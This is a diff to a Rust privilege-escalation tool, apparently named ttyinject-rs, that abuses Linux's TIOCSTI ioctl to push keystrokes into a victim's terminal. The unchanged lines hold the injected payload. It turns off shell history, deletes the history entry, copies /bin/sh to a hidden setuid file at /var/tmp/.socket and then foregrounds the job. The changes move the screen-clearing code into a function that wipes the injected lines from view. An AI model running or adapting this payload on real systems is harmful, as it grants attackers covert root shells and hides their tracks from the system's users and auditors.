@@ -6,7 +6,7 @@
 #[cfg(not(target_os = "linux"))]
 compile_error!("ttyinject-rs only supports Linux (it relies on the TIOCSTI ioctl)");
 
-use std::io::{self, IsTerminal as _};
+use std::io::{self, IsTerminal as _, Write as _};
 use std::os::unix::fs::MetadataExt as _;
 use std::time::Duration;
 use std::{env, fs, thread};
@@ -20,10 +20,6 @@ const START: &[u8] = b" exec 2>&-;set +o history\nhistory -d-1\n({ ";
 const COMMAND: &[u8] = b"cp /bin/sh /var/tmp/.socket; chmod 6777 /var/tmp/.socket";
 /// End part of the payload to inject into the tty's input buffer.
 const END: &[u8] = b";}>/dev/null 2>/dev/null &);set -o history;exec 2>&0;fg\n";
-
-/// Escape sequence to clear the terminal.
-const CLEAR: &str = "\x1b[4A\x1b[J";
-// const CLEAR: &str = "\x1b[H\x1b[J";
 
 /// Abuses the `TIOCSTI` ioctl to inject keystrokes into a terminal to escalate privileges on Linux.
 ///
@@ -90,11 +86,8 @@ pub fn run() -> anyhow::Result<()> {
     }
 
     // TODO: move initial checks to an external function?
-
-    // Clear the terminal.
-    println!("{CLEAR}");
-
     // TODO: implement some unit (and maybe integration) tests, excluding tests that don't work in ci
+    // TODO: update documentation to reflect changes (especially verbose/quiet mode)
 
     // No need to SIGCONT here because `fg` in the payload does that for us.
     Ok(())
@@ -121,6 +114,20 @@ pub fn tiocsti_inject(fd: c_int, byte: u8) -> io::Result<()> {
         return Err(io::Error::last_os_error());
     }
     Ok(())
+}
+
+/// Clear `lines` lines from the terminal. If `lines` is 0, clears the entire terminal.
+///
+/// # Examples
+///
+/// TODO.
+pub fn clear_terminal(lines: u16) {
+    if lines == 0 {
+        print!("\x1b[H\x1b[J");
+    } else {
+        print!("\x1b[{lines}A\x1b[J");
+    }
+    _ = io::stdout().flush();
 }
 
 #[expect(clippy::expect_used, reason = "tests can use `expect`")]
